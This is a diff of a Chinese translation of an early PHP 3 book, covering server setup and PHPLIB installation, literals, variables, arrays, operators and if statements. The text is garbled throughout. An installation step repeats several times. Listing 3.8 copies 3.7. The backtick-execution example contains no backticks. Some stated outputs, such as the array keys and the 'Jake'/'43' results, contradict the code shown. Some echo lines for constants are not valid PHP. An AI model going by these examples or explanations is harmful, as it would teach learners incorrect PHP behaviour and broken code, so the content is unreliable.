+- 27. `ln -s /usr/local/src/php-3.0.11/doc /usr/local/apache/htdocs/phpdocs` 创建符号链接，以便通过 http://localhost/phpdocs/ 访问 PHP 文档。
 - 28. 创建名为 `/usr/local/apache/htdocs/robots.txt` 的文件，包含以下行，使搜索引擎避免索引你的 PHPLIB 和 phpMyAdmin 文件以及 PHP 文档：
 ```
 #robots.txt for (hostname)
@@ -611,35 +467,22 @@ Disallow: /phpMyAdmin/
 在阅读第 15  章“并发访问”之前，需要安装 PHPLIB。按照以下步骤操作：
 
 - 1. 以 root 用户或任何可以在 /usr/local/apache 目录下写入文件的用户登录。
-
-- 2. `cd /usr/local/apache/`
-  在开始下载前进入服务器根目录。
-
+- 2. `cd /usr/local/apache/` 在开始下载前进入服务器根目录。
 - 3. 从以下网站下载最新版本。
   注意文件名可能已变为 phplib.tar.gz。
   http://phplib.sourceforge.de/
-
-- 4. `tar xvf phplib.tar.gz`
-  解压 PHPLIB 模块。
-
+- 4. `tar xvf phplib.tar.gz` 解压 PHPLIB 模块。
 - 5. 编辑 `/usr/local/lib/php3.ini` 文件，包含以下行：
   include_path=:/usr/local/apache/phplib-6.1/php
   auto_prepend_file = /usr/local/apache/phplib-6.1/prepend.php
   track_vars = on
   magic_quotes_gpc = on
   sendmail_path /usr/sbin/sendmail -t
-
 - 6. 创建名为 `poe_sessions` 的 mysql 数据库。我使用了 phpMyAdmin，但你也可以执行 SQL 命令。
-
 - 7. `cd /usr/local/apache/`
-
 - 8. 创建名为 `poe_sessions` 的 mysql 数据库。我使用了 phpMyAdmin，但你也可以执行 SQL 命令。
-
 - 9. 创建名为 `poe_sessions` 的 mysql 数据库。我使用了 phpMyAdmin，但你也可以执行 SQL 命令。
-
 - 10. 创建名为 `poe_sessions` 的 mysql 数据库。我使用了 phpMyAdmin，但你也可以执行 SQL 命令。
-
-
 
 ## 在 PHP 中处理数据
 
@@ -649,7 +492,7 @@ Disallow: /phpMyAdmin/
 
 本章展示了你如何在 PHP 中使用字面量、变量和常量。首先，让我们谈谈字面量。
 
-## 字面量
+### 字面量
 
 字面量是“按原样”表示或硬编码的值。例如，当你在程序源代码中看到像 12.5 这样的数字时，它指的是十二半，而不是四个字符“1”、“2”、“5”。以类似的方式，你也可以表示它们。例如，“Rolf D’Barno”（注意双引号）代表一个由十二个字符组成的字符串。因为这十二个字符被双引号包围，它们被算作一个字面量值。
 
@@ -658,7 +501,7 @@ PHP 使用两种类型的字面量：
 -   数字——最基本的数据类型。
 -   文本——由单个单元处理的字符序列。
 
-## 数字字面量
+### 数字字面量
 
 数字字面量在 PHP 中被频繁使用。它们代表你的程序执行某些任务所需的数字。在大多数情况下，你会使用十进制数字——这是最常用的。然而，你也可以在 PHP 中使用八进制（base 8）或十六进制（base 16）。
 
@@ -682,11 +525,11 @@ PHP 使用两种类型的字面量：
 -   54.534——带有千分位小数值的浮点。你也可以说 54 和 534/₁₀₀₀₀。
 -   .000034——一个非常小的浮点值。你可以用科学计数法将其表示为 3.4E-5。
 
-## 文本字面量
+### 文本字面量
 
 文本字面量是用引号包围的字符组，以便作为单个数据使用。实际上，PHP 对引号的处理比较宽松——你可以不加引号就将单个单词用作字符串。但请不要这样做。字面量有时被称为字符串，因为它们由一串字符连接在一起。它们在程序中经常被用于标识文件名、显示消息和提示输入。PHP 区分单引号（''`）、双引号（""`）和反引号（\` `）。
 
-## 单引号字符串
+#### 单引号字符串
 
 单引号字符串非常简单；只需用单引号包围你需要使用的文本即可。例如：
 
@@ -697,28 +540,26 @@ PHP 使用两种类型的字面量：
 
 'The real utility of single-quoted strings becomes apparent when you need to include a single quote in the string. For example, you use a backslash to escape the quote: \'It\'s a beautiful day' (注：由于 OCR 文本存在错误，此处已根据逻辑进行了修复)
 
-
-
-
-
-## 字面量
-
-使用数字字符 9 的 ASCII 码。ASCII 码列在附录 B 中。
-
-## 反引号字符串
+### 反引号字符串
 
 可以认为，反引号字符串并不是真正的文本字面量。这是因为 PHP 使用反引号字符串来执行系统命令。当 PHP 看到反引号字符串时，它会将内容传递给 Windows、UNIX 或你正在使用的任何操作系统。字面 3.2 显示了如何进行操作，图 3.2 显示了在 Web 浏览器窗口中显示的系统命令输出。
 
 反引号字符串不是被反引号（` ）包围的文本。
 
-### 列表 3.2 back_quoted_string.php—使用反引号字符串执行命令
+#### 列表 3.2 back_quoted_string.php—使用反引号字符串执行命令
 
 ```php
+
 <?php
+
 echo '<pre>';
+
 echo "ls *.php";
+
 echo '</pre>';
+
 ?>
+
 ```
 
 ![](img/60cf9e8f697416e18e3ca18e3d4f7f4e_58_0.png)
@@ -727,7 +568,7 @@ echo '</pre>';
 
 用于双引号字符串的转义序列也可以用于反引号字符串。
 
-## 变量
+### 变量
 
 字面量仅占了你在程序内部可以使用部分内部数据。当你需要存储数据值并在程序运行过程中更改它们时，你就需要变量。PHP 有三种类型的变量：
 
@@ -741,13 +582,13 @@ echo '</pre>';
 
 将在下方分别讨论每个变量类型。你将看到如何为变量命名并设置它们的值，以及它们的一些用途。
 
-## 标量变量
+#### 标量变量
 
 标量变量用于跟踪单一信息。例如，客户的名称或销售额。你可以为标量变量使用任何你能想象的名称，只要它以 `$` 开头，且第二个字符是字母或下划线。
 
 如果你用过 Visual Basic 编程，在为变量命名时需要格外小心。只需记住*所有标量都以 $ 开头*，而不仅仅是字符串，且 `$` 是名称的开始，而不是结束。
 
-## 提示
+##### 提示
 
 让我们直接开始看一些变量名：
 
@@ -761,207 +602,297 @@ echo '</pre>';
 
 现在你已经知道标量变量名是什么样的了，是时候查看给它们赋值了。为变量赋值是通过等号（=）完成的，如列表 3.3 所示。
 
-### 列表 3.3 assign_scal.php—使用赋值运算符
+##### 列表 3.3 assign_scal.php—使用赋值运算符
 
 ```php
+
 //PHP
+
 // 给名为 $int_page_number 的变量
+
 // 赋值 46 的值。
+
 $int_page_number = 46;
 
 // 给名为 $str_magazine_title 的变量
+
 // 赋值一个字符串值。
+
 $str_magazine_title = 'PHP is good!';
+
 ?>
+
 ```
 
 这段代码为变量分配了字面量。在赋值文本字面量时，请使用单引号字符串，因为它们的效率更高。
 
 PHP 使用两个斜杠（//）来开始注释。"//" 符号标记后的任何字符都会被忽略。
 
-## 注意
+##### 注意
 
 赋值值后，你可以根据需要更改它们。下一个示例（列表 3.4）进行了一个变量赋值，并使用第二次赋值更改该变量的值。第二次赋值将值增加了 1。
 
-### 列表 3.4 change_scalars.php—更改变量的值
+##### 列表 3.4 change_scalars.php—更改变量的值
 
 ```php
+
 <?php
+
 // 给名为 $int_page_number 的变量
+
 // 赋值 46 的值。
+
 $int_page_number = 46;
 
 // 增加页码变量。
+
 $int_page_number = $int_page_number + 1;
+
 ?>
+
 ```
 
 > 注意：在 PHP 中，你永远不需要声明、定义或分配简单数据类型。
 
-## 数组
+#### 数组
 
 PHP 数组是键值对这一事实有时会造成障碍，因为没有简单的方法来显示这些值。这种功能的缺失会阻碍开发阶段的程序。虽然本书尚未介绍函数，但列表 3.5 提供了一个函数。只需将 `dump_array` 函数视为一个黑盒——读完书后，你就能弄清楚它的作用了。使用此示例作为模板；注释说明了如何在你的程序中使用它。图 3.3 显示在使用 `dump_array` 函数的结果。
 
-### 列表 3.5 dump_array.php—更改变量的值
+##### 列表 3.5 dump_array.php—更改变量的值
 
 ```php
+
 <?php
 
 // 定义 dump_array 函数。
+
 function dump_array($var) {
+
     switch (getType($var)) {
+
         case 'integer':
+
         case 'double':
+
         case 'string':
+
             echo $var;
+
             break;
+
         case 'array':
+
             echo '<table border="1"\n';
+
             do {
+
                 echo '<<tr><td align="left" valign="top">';
+
                 echo key($var);
+
                 echo '</</td><td>';
+
                 dump_array($var[key($var)]);
+
                 echo '</td></tr>';
+
             } while (next($var));
+
             echo '</table>';
+
             break;
+
         default:
+
             echo '未知数据类型.';
+
             break;
+
     }
+
 }
 
 // 初始化 zoo 数组。
+
 $arr_zoo = array(
+
     'Pelican' => '大嘴的鸟。',
+
     'Cheetah' => '跑快的猫。',
+
     'Horse' => '四足动物。'
+
 );
 
 // 调用 dump_array 函数显示 zoo 数组
+
 // 的元素。
+
 dump_array($arr_zoo);
+
 ?>
+
 ```
 
 `dump_array` 函数不按特定顺序显示数组键值对。第 4 章讨论了允许你排序数组元素的函数。
 
-
-
-
-
-## 变量
+#### 变量
 
 到目前为止，我们只使用字符串字面量作为数组的键。让我们发挥一点创意吧。你认为以下数组初始化创建了哪些键？
 
 ```php
+
 $arr_mixed = array(
+
   43 => 'Jake',
+
   'Rebecca'
+
 );
+
 ```
 
 `arr_mixed` 数组的键是 0, 1 和 2。如果没有为某个值提供键，PHP 会自动为你提供一个。默认键从 0 开始，并且每当向数组中添加一个与键相关联的值时，该键就会递增 1。你可以将所有字面量键（包括数字和字符串）替换为标量变量，并且仍然可以获取正确的值。你可以说：
 
 ```php
+
 $key = 1;
+
 echo $arr_mixed[$key];
+
 ```
 
 前两行显示了 `Jake`，展示了 PHP 如何根据需要自动将数值数据类型转换为字符串类型。在接下来的几行中，键被初始化为字符串：
 
 ```php
+
 $key = '1';
+
 echo $arr_mixed[$key];
+
 ```
 
 这两行代码也显示了 `43`，说明 PHP 会自动将字符串转换为数字。有时你可能想在数组内部使用变量。例如：
 
 ```php
+
 $int_page_number = 43;
+
 $str_first_name = 'Jake';
+
 $arr_mixed = array(
+
   $int_page_number => $str_first_name,
+
   'Rebecca'
+
 );
+
 ```
 
-## 多维数组
+#### 多维数组
 
 对于许多程序来说，简单的值列表是不够的。例如，假设你需要存储一系列书籍的页数和出版商名称。当你需要添加和编辑信息时，同时跟踪两个列表 `number_of_pages`（页数）和 `publisher_names`（出版商名称）会变得麻烦。保持两个列表同步是一个潜在的错误来源。
 
-多维数组提供了一种非常灵活的数据结构。每个数组元素都可以包含另一个数组。遗憾的是，我不会详细介绍数据结构如何高效使用内存，或者为什么访问键的值是一个如此快速的过程。但是，如果你好奇，我鼓励你找一本关于数据结构的书籍学习更多。
+多维数组提供了一种非常灵活的数据结构。每个数组元素都可以包含另一个数组。遗憾的是，我不会详细介绀数据结构如何高效使用内存，或者为什么访问键的值是一个如此快速的过程。但是，如果你好奇，我鼓励你找一本关于数据结构的书籍学习更多。
 
 哈希（Hashes）可以这样初始化：
 
 ```php
+
 $arr_books = array(
+
   '679-76819' => array(
+
     'name' => 'The Demolished Man',
+
     'pages' => 243,
+
     'publisher' => 'Vintage Books'
+
   ),
+
   '312-85395' => array(
+
     'name' => 'Children of the Mind',
+
     'pages' => 349,
+
     'publisher' => 'Tor Books'
+
   )
+
 );
+
 ```
 
 上面的示例使用每本书的 ISBN 作为进入 `arr_books` 哈希的键。每本书都有自己专门用于存储特定信息的子哈希。为了访问子哈希中的信息，常规的数组表示法被扩展为使用两个键。例如，获取《被毁灭的人》（The Demolished Man）的页数的方法是：
 
 ```php
+
 echo $arr_books['679-76819']['pages'];
+
 ```
 
 你会发现哈希极其灵活。当我在我写的每个程序中都使用哈希时，这种说法并不夸张。哈希之所以如此灵活的原因之一是你可以根据需要动态添加条目。如果在运行程序时，发现需要存储作者姓名，那么向哈希中添加该内容非常简单：
 
 ```php
+
 $arr_books['679-76819']['author'] = 'Orson Scott Card';
+
 ```
 
 注意，哈希数据结构允许你在不影响任何其他子哈希的情况下向一个子哈希添加条目。当你开始使用 PHP 从许多数据库表中收集信息时，可以使用哈希来合并信息。例如，如果你正在处理产品数据库，可以将第一个供应商的信息存储在一个哈希中。然后读取第二个供应商的信息，并将新信息存储在同一个哈希中。当你完成所有的读取和存储后，单个哈希就包含了所有的库存信息。
 
 列表 3.5 之前提供的 `dump_array` 函数说明了哈希的组织结构。第 46 页的图 3.4 显示了 `dump_array` 函数解释的 `arr_books` 哈希的组织结构。
 
-## 变量插值
+#### 变量插值
 
 双引号字符串还有另一个我们尚未讨论过的特征，因为这涉及到**变量**。现在你已经熟悉了 PHP 变量是如何运作的，让我们再次观察双引号字符串。
 
 变量插值意味着 PHP 可以在双引号字符串中将变量名替换为它们的值。这个概念扩展了变量“代表”值的正常方式。例如，如果 `$int_count` 是 14，那么 `$int_count + 14` 实际上是 28。PHP——以及大多数语言——这种替换也是在字符串内部完成的。例如
 
 ```php
+
 $str_size = 'big';
+
 echo "Jack was $str_size man.";
+
 ```
 
 当你需要在变量名后面紧跟空格和标点以外的字符时，就会出现问题。以下代码显示了这种情况：
 
 ```php
+
 $str_size = 'big';
+
 echo "Jack was $str_sizeeman.";
+
 ```
 
 PHP 看到的不是变量 `$str_size` 后面跟着一个字符串 ('man')，而是看到了一个名为 `$str_sizeman` 的变量。在变量名周围加上大括号可以解决这个问题：
 
 ```php
+
 $str_size = 'big';
+
 echo "Jack was {$str_size}man";
-```
-
-
-访问常量的值与访问变量类似，不同之处是你不需要初始的美元符号（$上面定义的两个常量访问方式如下：
 
 ```
+
+#### 访问常量的值与访问变量类似，不同之处是你不需要初始的美元符号（$上面定义的两个常量访问方式如下：
+
+```
+
 echo 'PI' = '.' . PI;
+
 echo 'HOST' = '.' . HOST;
+
 ```
 
 由于不使用初始的美元符号，常量不支持变量插值。
 
-## 运算符
+### 运算符
 
 运算符告诉计算机需要执行哪些操作。尝试像给汽车司机下指令一样去思考运算符：例如，你可能会说“左转”或“右转”。这些命令可以看作是方向运算符，就像加法和减法数学运算符（它们表示“加上这个”或“减去这个”）一样。相反，如果你在汽车移动时大喊“停止”，它应该取代其他命令。这意味着“停止”的优先级高于“左转”和“右转”。
 
@@ -969,13 +900,13 @@ echo 'HOST' = '.' . HOST;
 
 操作数本质上是递归性。在 PHP 中，表达式 `4 / 2`——两个操作数和一个除法运算符——可以被视为值为 `2` 的操作数。另一个例子是 `(5 + 9) - 7`，这是一个由两个操作数相互相减组成的表达式。第一个操作数是 `(5 + 9)`，第二个操作数是 `7`。
 
-## 优先级
+#### 优先级
 
 运算符优先级在每种计算机语言中都非常重要，PHP也不例外。优先级指示哪个运算符应该先被求值。PHP 使用结合性来决定哪些运算符结合。例如，一元减运算符的结合性是从右到左的，因为它影响紧邻右侧的操作数。你可能没有意识到，即使访问数组元素时使用的方括号也是运算符。表 3.2 为了完整起见包含了这些运算符，但你不需要担心它们的优先级。随着经验积累，你会发现运算符优先级仅适用于算术运算符和逻辑运算符。
 
 使用括号让你精确地控制求值顺序；括号内的任何内容都会先被求值。
 
-### 表 3.2 运算符的优先级和结合性
+##### 表 3.2 运算符的优先级和结合性
 
 | 级别 | 运算符 | 描述 | 结合性 |
 |---|---|---|---|
@@ -989,7 +920,7 @@ echo 'HOST' = '.' . HOST;
 | 08 | <<, >> | 左移、右移 | 从左到右 |
 | 07 | /, *, % | 除法、乘法、取模 | 从左到右 |
 
-### 表 3.2 运算符的优先级和结合性（续）
+##### 表 3.2 运算符的优先级和结合性（续）
 
 | 级别 | 运算符 | 描述 | 结合性 |
 | --- | --- | --- | --- |
@@ -1004,10 +935,15 @@ echo 'HOST' = '.' . HOST;
 我们的第一个示例显示一元减运算符的优先级高于自增运算符：
 
 ```
+
 $a = 5;
+
 $b = $a++;
+
 echo "a = $a<br>"
+
 echo "b = $b<br>";
+
 ```
 
 这些行显示：
@@ -1017,10 +953,15 @@ b = 5
 现在让我们看看使用一元减号会发生什么：
 
 ```
+
 $a = 5;
+
 $b = -$a++;
+
 echo "a = $a<br>"
+
 echo "b = $b<br>";
+
 ```
 
 这些行显示：
@@ -1033,14 +974,16 @@ b = -5
 下一个示例清楚地显示了除法的优先级高于加法，使用括号：
 
 ```php
+
 $a = (5 + 9) / 2;
+
 ```
 
 这些行显示：
 a = 7
 $b 变量获得了值 7，因为括号内的表达式先被求值。
 
-## 算术运算符
+#### 算术运算符
 
 这些运算符反映了你在小学阶段学到的运算符。加法、减法、乘法和除法是大多数数学语句的基础。取模运算符是
 
@@ -1048,16 +991,24 @@ $b 变量获得了值 7，因为括号内的表达式先被求值。
 
 当你的程序需要遍历列表并每隔几个项目执行代码块时，模运算符是无价之宝。列表 3.7 中的示例向了了如何每十项执行一次操作。
 
-# 列表 3.7 modulus.php—每十项显示一次消息
+##### 列表 3.7 modulus.php—每十项显示一次消息
 
 ```php
+
 <?php
+
 for ($index = 1; $index <= 100; $index++) {
+
     if ($index % 10 == 0) {
+
         echo "$index<br>";
+
     }
+
 }
+
 ?>
+
 ```
 
 此程序的输出应该看起来如图 3.6 所示。
@@ -1068,11 +1019,11 @@ for ($index = 1; $index <= 100; $index++) {
 
 注意，每十个项目都会打印一次。通过改变模运算符右侧的值，你可以影响在打印消息之前处理的项目数。将值改为 15 意味着每 15 个项目打印一次消息。
 
-## 运算符
+#### 运算符
 
 第 4 章“控制你的程序”详细描述了 `if` 和 `for` 语句。
 
-## 条件运算符
+#### 条件运算符
 
 这些运算符允许你测试一个变量（或字面量）与另一个变量之间的关系。例如，5 **大于** 12 吗？评估条件运算符及其操作数的结果始终为真（值为 1）或为假（值为 0）。表 3.3 显示了 PHP 中的条件运算符。
 
@@ -1092,9 +1043,9 @@ for ($index = 1; $index <= 100; $index++) {
 
 > 意识到等价运算符是一对等号而不是仅仅一个，这是非常重要的。程序中引入了许多错误，是因为人们忘记了这条规则，在测试条件时使用了单个等号。
 
-注意
+##### 注意
 
-## 一元运算符
+#### 一元运算符
 
 一元运算符作用于单个操作数。它们用于更改操作数的符号，增加或减少操作数的值。增加一个值意味着在其取值上加 1。减小一个值意味着从其值上减去 1。表 3.4 列出了 PHP 中的一元运算符。
 
@@ -1117,22 +1068,30 @@ for ($index = 1; $index <= 100; $index++) {
 
 真值为 1。假值为 0。
 
-## 运算符
+##### 运算符
 
 位反转运算符翻转其操作数中的每个位，从 1 变为 0 或反之。在二十年的编程生涯中，我从未需要使用过这个运算符。因此，我将避免用示例浪费你的时间。
 
 如果 `++` 或 `--` 运算符出现在操作数之前，则在使用操作数的值之前对其加或减。如果 `++` 或 `--` 运算符出现在操作数之后，则使用操作数的值，然后根据需要对操作数进行加或减。列表 3.8 显示了自增运算符的使用。
 
-# 列表 3.8 preincrement.php—使用自增运算符
+##### 列表 3.8 preincrement.php—使用自增运算符
 
 ```php
+
 <?php
+
 for ($index = 1; $index <= 100; $index++) {
+
     if ($index % 10 == 0) {
+
         echo "$index<br>";
+
     }
+
 }
+
 ?>
+
 ```
 
 此程序的输出应该看起来如图 3.6 所示。
@@ -1143,17 +1102,18 @@ for ($index = 1; $index <= 100; $index++) {
 
 注意，每十个项目都会打印一次。通过改变模运算符右侧的值，你可以影响在打印消息之前处理的项目数。将值改为 15 意味着每 15 个项目打印一次消息。
 
+#### 正如你所见，1024 的值已经超出了其他示例中所使用的 8 位范围。这表明你可使用的位数并不限于一个字节。实际上，你所受限于 PHP 为单个标量变量使用的字节数，在在大多数情况下，这可能是四个字节。
 
-
-正如你所见，1024 的值已经超出了其他示例中所使用的 8 位范围。这表明你可使用的位数并不限于一个字节。实际上，你所受限于 PHP 为单个标量变量使用的字节数，在在大多数情况下，这可能是四个字节。
-
-## 字符串连接运算符
+#### 字符串连接运算符
 
 字符串连接运算符将两个字符串连接在一起。如果两个操作数之一是数值，它将自动转换为字符串。下面的示例展示了这种自动转换：
 
 ```
+
 $str_a = "This box can hold " . 55 . " items";
+
 echo "$str_a<br>";
+
 ```
 
 此代码显示以下输出：
@@ -1165,10 +1125,15 @@ This box can hold 55 items.
 你也可以这样使用变量作为连接运算符的操作数：
 
 ```
+
 $str_a = 'AAA';
+
 $str_b = 'BBB';
+
 $str_c = $str_a . $str_b;
+
 echo "$str_c<br>";
+
 ```
 
 此代码显示以下输出：
@@ -1177,7 +1142,7 @@ AAABBB
 
 注意，字符串在连接时没有添加任何空格或其他分隔符。如果你想在字符串连接后它们之间留有空格，必须确保原始字符串包含空格字符，要么在第一个字符串的结尾，要么在第二个字符串的开头。
 
-## 逻辑运算符
+#### 逻辑运算符
 
 这些运算符实现了布尔逻辑或真/假逻辑。在句子“如果 John 发烧且 John 鼻窦阻塞或 John 耳痛，且 John 没有超过 60 岁，那么 John 就感冒了”中，“and”、“or”和“not”充当逻辑运算符。
 
@@ -1209,9 +1174,13 @@ AAABBB
 以下代码展示了 `&&` 运算符的使用：
 
 ```
+
 if ($int_a == 10 && $int_b == 9) {
+
     echo "Error";
+
 }
+
 ```
 
 如果两个操作数中的任何一个为假，则跳过 `echo` 命令。顺便说，这个示例表明 `==` 运算符的优先级高于 `&&` 运算符。每个 `==` 运算符会被评估，得到的值将作为 `&&` 运算符的操作数。
@@ -1230,9 +1199,13 @@ if ($int_a == 10 && $int_b == 9) {
 以下代码展示了 `||` 运算符的使用：
 
 ```
+
 if ($int_a == 10 || $int_a == 11) {
+
     echo "Error";
+
 }
+
 ```
 
 如果 `||` 操作中任一评估结果为真，则执行 `echo` 命令。
@@ -1242,23 +1215,30 @@ if ($int_a == 10 || $int_a == 11) {
 如果你不小心，这种短路特性可能会成为错误的来源。例如，在下面的代码段中，如果 `$int_a++` 评估为真，则变量 `$int_b` 将不会递增。
 
 ```
+
 if ($int_a++ || $int_b++) {
+
   echo "true<br>";
+
   echo "a=$int_a b=$int_b<br>";
+
 }
+
 ```
 
 你可能想尝试以下方法来判断 `$int_a` 是否等于 9 或 10。不要这样做。
 
 ```
+
 if ($int_a - (9 || 10)) {
+
   echo "Error";
+
 }
+
 ```
 
-
-
-数组包含另一个数组。当一个键值对的值的一半是数组时，它们就会被创建。
+#### 数组包含另一个数组。当一个键值对的值的一半是数组时，它们就会被创建。
 
 变量插值用于在字符串内部将变量替换为它的值。然而，插值不能用于深度超过一层的数组。
 
@@ -1274,17 +1254,17 @@ PHP 有许多不同类型的操作符，其中大多数在本章中都会讨论�
 
 下一章“控制你的程序”将介绍语句的定义以及如何使用函数来实现程序的模块化。
 
-# 控制你的程序
+## 控制你的程序
 
 本章将深入内部原理，以查看程序具体是如何使用函数、表达式和语句进行控制的。
 
 前一个章节向你展示了如何在非常底层上操作数据。如果我们把操作数和操作符视为构建组件，你将看到它们被组合成表达式。表达式反过来被用于形成语句。语句被用于形成函数。而函数被用于形成程序。
 
-## 提示
+### 提示
 
-当你学习编程语言的基本元素时，想要看到大局——看到这些元素如何组合成一个完整的程序——是很困难的。别担心。微笑。接下来的章节将展示整个程序，并解释它们是如何一步步构建的。
+当你学习编程语言的基本元时，想要看到大局——看到这些元素如何组合成一个完整的程序——是很困难的。别担心。微笑。接下来的章节将展示整个程序，并解释它们是如何一步步构建的。
 
-# 表达式
+### 表达式
 
 当操作数和操作符结合时，它们就构成了表达式。你在书中的示例中见过许多表达式。然而，直到现在，我们还没有关注它们。
 最基本的表达式是数字字面量：
@@ -1292,15 +1272,20 @@ PHP 有许多不同类型的操作符，其中大多数在本章中都会讨论�
 从这个简微的开始，你可以变得越来越复杂：
 
 ```
+
 -12
+
 -12 + 14
+
 -12 + 14 * (24 / 12)
+
 (-12 + 14 * (24 / 12)) && calculate_total_cost()
+
 ```
 
 注意，每一个表达式无论复杂程度如何，实际上都是较小的表达式和一个或多个操作符的组合。当计算机程序员用自身来定义事物时，这被称为递归。每执行一次递归，表达式就会被拆解成越来越简单的部分，直到计算机能够正确地求值这些部分。
 
-## 简单表达式
+#### 简单表达式
 
 简单表达式由单个赋值或单次函数调用组成。关于这些表达式说不了什么，因为它们太简单了。以下是一些示例：
 
@@ -1308,7 +1293,7 @@ PHP 有许多不同类型的操作符，其中大多数在本章中都会讨论�
 - * $str_first_name = 'John'——初始化一个标量变量
 - * $arr_first_names = array('John', 'Marie')——初始化一个数组变量
 
-## 带有副作用的简单表达式
+#### 带有副作用的简单表达式
 
 表达式除了其显式任务之外还可以产生副作用。当一个或多个变量的值发生变化，且这种变化不是赋值运算符的结果时，就会产生副作用。例如，调用的函数可以设置页面作用域变量（在函数内部使用 `global` 关键字指定），或者自增运算符可以改变变量的值。副作用往往会让程序更难理解，因此你编程的目标之一应该是尽可能地减少副作用。
 
@@ -1319,7 +1304,7 @@ PHP 有许多不同类型的操作符，其中大多数在本章中都会讨论�
 - * $int_total_glasses = ++int_number_of_glasses——除了赋值给 $int_total_glasses 的值外，$int_number_of_glasses 变量也自增。
 - * function one() global $str_directory_name; $str_directory_name = '/dos_data';——当使用 one() 函数时，页面作用域变量被改变了。
 
-## 复杂表达式
+#### 复杂表达式
 
 复杂表达式可以使用任意数量的任意字面量、变量、操作符和函数。这里是一些示例：
 
@@ -1328,9 +1313,9 @@ PHP 有许多不同类型的操作符，其中大多数在本章中都会讨论�
 
 > 有时，很难判断你是否有足够的右括号来匹配所有的左括号。从左边开始，计算每一个左括号，当你发现一个右括号时，从总数中减一。如果你在表达式结束时计数为零，则括号是平衡的。
 
-提示
+##### 提示
 
-## 语句
+#### 语句
 
 所有的 PHP 程序都由语句组成。无论语句是简单还是复杂，它们都是一个接一个执行的——按顺序执行——直到程序结束、处理跳转语句或分支语句。
 
@@ -1339,24 +1324,29 @@ PHP 有许多不同类型的操作符，其中大多数在本章中都会讨论�
 这个语句没做什么，但它是有效的。分号字符标记语句的结束。语句可以根据你的需要变得复杂。例如：
 
 ```php
+
 if ($int_number_of_rooms > 9)
+
     $str_house_size = "large";
+
 else
+
     $str_house_size = "small";
+
 ```
 
 $int_number_of_rooms > 9 时，$str_house_size 被赋值为 "large"。语句就像人类语言中的句子一样可以被分解成组件。在 PHP 中这些组件是字面量、变量、函数和关键字。这些关键字（if, elseif, while, do, for, break, continue, switch, case, default, require, include）是语言不可或缺的，并提供了控制流的能力。require 和 include 关键字也被记录了。其余的后续章节中讨论。
 
-## 语句类型
+#### 语句类型
 
 PHP 有 6 种类型的语句，如 4.1 所示。
 
-## 无操作语句
+##### 无操作语句
 
 无操作语句求值但不执行操作。例如，语句 `10 + 20;` 的值为 30，但因为没有变量被改变，所以没有完成工作。20 值在看到下一个语句时就会被遗忘。
 如果没有工作完成，无操作语句有什么用？我不知道；如果你发现了它们的用处，请告诉我。
 
-## 表 4.1 PHP 语句
+##### 表 4.1 PHP 语句
 
 | 语句类型 |  |
 |---|---|
@@ -1367,22 +1357,19 @@ PHP 有 6 种类型的语句，如 4.1 所示。
 | 循环 | 重复执行一系列语句，直到条件为真或条件为假。 |
 | 跳转 | 无条件地改变程序流到代码中的另一个点。 |
 
-## 操作语句
+##### 操作语句
 
 操作语句使用表达式执行某些任务。它们可以增加或减少变量。或者可以调用函数。它们可能是最频繁使用的语句类型。
 
-## 赋值语句
+##### 赋值语句
 
 赋值语句并不复杂。它们给变量赋值。你在上一章“在 PHP 中操作数据”中读过赋值运算符，所以我们在这里浪费宝贵的空间重复相同的信息。
 
-## 决策语句
+##### 决策语句
 
 决策语句使用 **if** 和 **switch** 关键字根据表达式的求值结果执行语句，或者根据求值结果在两个操作之间进行选择。
 
-
-
-
-## if 关键字
+###### if 关键字
 
 if 语句评估一个表达式以产生一个真或假值。表达式的值控制了 PHP 执行哪一个语句块。
 你将发现 if 语句有三种不同的形式：
@@ -1390,45 +1377,76 @@ if 语句评估一个表达式以产生一个真或假值。表达式的值控�
 - 1. 
 
 ```php
+
 if ( EXPRESSION ) {
+
   // 当表达式为真时执行的
+
   // 代码块
+
 }
+
 ```
 
 - 2. 
 
 ```php
+
 if ( EXPRESSION ) {
+
   // 当表达式为真时执行的
+
   // 代码块
+
 } else {
+
   // 当表达式为假时执行的
+
   // 代码块
+
 }
+
 ```
 
 - 3. 
 
 ```php
+
 if ( EXPRESSION_1 ) {
-  // 当表达式_1 为真时执行的
-  // 代码块
+
+
+
+
+// 当表达式_1 为真时执行的
+
+// 代码块
+
 } elseif ( EXPRESSION_2 ) {
+
   // 当表达式_2 为真时执行的
+
   // 代码块
+
 } else {
+
   // 当所有表达式均为假时执行的
+
   // 代码块
+
 }
+
 ```
 
 表达式可以包含第3章“在PHP中处理PHP数据”中讨论过的任何操作符。即使是赋值运算符也可以，因为赋值操作的值就是被赋值的值。上一个例子有点难以理解，让我们来看另一个例子：
 
 ```php
+
 $int_a = 10;
+
 if ($int_a -= 5)
+
     echo "a = $int_a<br>";
+
 ```
 
 ## 语句
@@ -1436,7 +1454,9 @@ if ($int_a -= 5)
 这行代码显示：
 
 ```
+
 a = 5
+
 ```
 
 if 语句通过从 $int_a 中减去 5 并将结果赋值给 $int_a 来评估 $int_a -= 5。如果结果为真（即不为 0），则执行 echo 语句。
@@ -1450,12 +1470,19 @@ if 语句通过从 $int_a 中减去 5 并将结果赋值给 $int_a 来评估 $in
 以下几行代码展示了 else 关键字的用法：
 
 ```php
+
 $int_a = 5;
+
 if ($int_a -= 5) {
+
   echo "a = $int_a<br>";
+
 } else {
+
   echo "a is zero.<br>";
+
 }
+
 ```
 
 这行代码显示：
@@ -1465,14 +1492,23 @@ a is zero.
 elseif 关键字的使用方式如下：
 
 ```php
+
 $str_name = 'John';
+
 if ($str_name == 'Joe') {
+
   echo "Your appointment is on Monday.<br>";
+
 } elseif ($str_name == 'John') {
+
   echo "Your appointment is on Wednesday.<br>";
+
 } else {
+
   echo "Your appointment is on Friday.<br>";
+
 }
+
 ```
 
 这些行代码显示：
@@ -1482,32 +1518,55 @@ Your appointment is on Wednesday.
 每当 $str_name 不为 'Joe' 或 'John' 时，属于 else 子句的语句就会执行。否则，执行另外两个子句之一。else 关键字也用于捕获未知或不可预的值，通过在 else 语句块中放置一个显示未知值的错误消息来实现。。例如：
 
 ```php
+
 if ($str_input == 'A') {
+
     // 执行 A 语句。
+
 } elseif ($str_input == 'B') {
+
     // 执行 B 语句。
+
 } else {
+
     echo "Unrecognized Input Error: '$str_input' is unknown.";
+
 }
+
 ```
 
 到目前为止看到的所有示例在 if 语句的所有子句中都使用了同一个变量。然而，你可以更有创意，如下面关于一个虚构房屋及其智能电脑的示例所示：
 
 ```php
+
 if ($int_left_window_open == 1) {
+
     $int_outside_temperature = check_outside_temperature();
+
     if ($int_outside_temperature < 70) {
+
         close_window('left');
+
     }
